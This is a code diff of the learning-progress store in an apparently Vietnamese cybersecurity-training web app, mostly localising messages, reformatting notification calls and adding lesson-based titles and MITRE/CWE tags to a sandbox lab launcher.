-          options: ["1 RTT (or 0-RTT on resumption)", "2 RTT", "3 RTT", "5 RTT"],
-          correct: 0,
-          explanation: "TLS 1.3 streamlines negotiation down to 1-RTT for new connections and supports 0-RTT resumption.",
-        },
-      },
-    ],
-  },
 ]
 
 /**
  * useLearningStore
- * Manages courses, active interactive lesson player, completed lessons, enrollment, and XP rewards.
+ * Quản lý danh mục giáo trình, tiến độ bài học, điểm thưởng XP và tương tác Sandbox.
  */
 export const useLearningStore = create((set, get) => {
   // Load saved state from localStorage if available
-  const savedEnrolled = JSON.parse(localStorage.getItem("cyber_enrolled_courses") || '["mod-web201", "mod-soc101"]')
-  const savedCompleted = JSON.parse(localStorage.getItem("cyber_completed_lessons") || '{"mod-web201": ["s1", "s2"], "mod-soc101": ["s1", "s2"], "mod-sec101": ["s1", "s2", "s3", "s4"]}')
+  const savedEnrolled = JSON.parse(
+    localStorage.getItem("cyber_enrolled_courses") || '["mod-web201", "mod-soc101"]'
+  )
+  const savedCompleted = JSON.parse(
+    localStorage.getItem("cyber_completed_lessons") ||
+      '{"mod-web201": ["s1", "s2"], "mod-soc101": ["s1", "s2"], "mod-sec101": ["s1", "s2", "s3", "s4"]}'
+  )
   const savedXp = parseInt(localStorage.getItem("cyber_user_learning_xp") || "850", 10)
 
   return {
@@ -953,7 +925,7 @@ export const useLearningStore = create((set, get) => {
     enrolledCourses: savedEnrolled,
     completedLessons: savedCompleted, // { [courseId]: string[] }
     userXp: savedXp,
-    
+
     // Interactive Lesson Modal state
     activeLessonModal: null, // { course, lesson, lessonIndex }
 
@@ -981,10 +953,12 @@ export const useLearningStore = create((set, get) => {
       set({ enrolledCourses: updated })
 
       const course = courses.find((c) => c.id === courseId)
-      useNotificationStore.getState().success(
-        "Kích hoạt khóa học thành công!",
-        `Bạn đã ghi danh vào track: ${course?.title || courseId}`
-      )
+      useNotificationStore
+        .getState()
+        .success(
+          "Kích hoạt khóa học thành công!",
+          `Bạn đã ghi danh vào track: ${course?.title || courseId}`
+        )
     },
 
     // Toggle completed status of a lesson
@@ -1014,10 +988,12 @@ export const useLearningStore = create((set, get) => {
       })
 
       if (!isCurrentlyDone) {
-        useNotificationStore.getState().success(
-          "Hoàn thành bài học!",
-          `+100 XP thưởng. Tiến độ khóa học được cập nhật.`
-        )
+        useNotificationStore
+          .getState()
+          .success(
+            "Hoàn thành bài học!",
+            "+100 XP thưởng. Tiến độ khóa học được cập nhật."
+          )
       }
     },
 
@@ -1087,10 +1063,12 @@ export const useLearningStore = create((set, get) => {
         })
       } else {
         // Course completed!
-        useNotificationStore.getState().success(
-          "Chúc mừng tốt nghiệp module!",
-          `Bạn đã hoàn thành 100% giáo trình ${course.code}!`
-        )
+        useNotificationStore
+          .getState()
+          .success(
+            "Chúc mừng tốt nghiệp module!",
+            `Bạn đã hoàn thành 100% giáo trình ${course.code}!`
+          )
       }
     },
 
@@ -1115,22 +1093,27 @@ export const useLearningStore = create((set, get) => {
     // Launch connected Sandbox Lab directly from a lesson
     launchLessonLab: (labId) => {
       const targetId = labId || "lab-01"
-      // Check useLabStore
       const labStore = useLabStore.getState()
-      // Let's create an ephemeral lab target or find matching
+      const course = get().activeLessonModal?.course
+      const lesson = get().activeLessonModal?.lesson
       const targetLab = {
         id: targetId,
-        title: "Hands-on Sandbox Target",
+        title: lesson ? `Thao Trường: ${lesson.title}` : (course?.title || "Mục Tiêu Diễn Tập Sandbox"),
         targetIp: "10.10.14.89",
         targetPort: "8080",
         flag: "FLAG{CYBER_RANGE_MISSION_SUCCESS}",
         points: 450,
+        mitre: lesson?.mitre?.split(" - ")[0] || "T1190",
+        tags: [lesson?.cve?.split(":")[0] || "CWE-89"],
       }
       labStore.startLab(targetLab)
-      useNotificationStore.getState().info(
-        "Khởi động Cyber Range Sandbox",
-        "Terminal máy ảo đã được cấp phát trên cổng mạng cô lập."
-      )
+      labStore.openTerminal()
+      useNotificationStore
+        .getState()
+        .info(
+          "Khởi động Cyber Range Sandbox",
+          `Terminal máy ảo đã được cấp phát trên cổng mạng cô lập (Target: 10.10.14.89:8080).`
+        )
     },
   }
 })
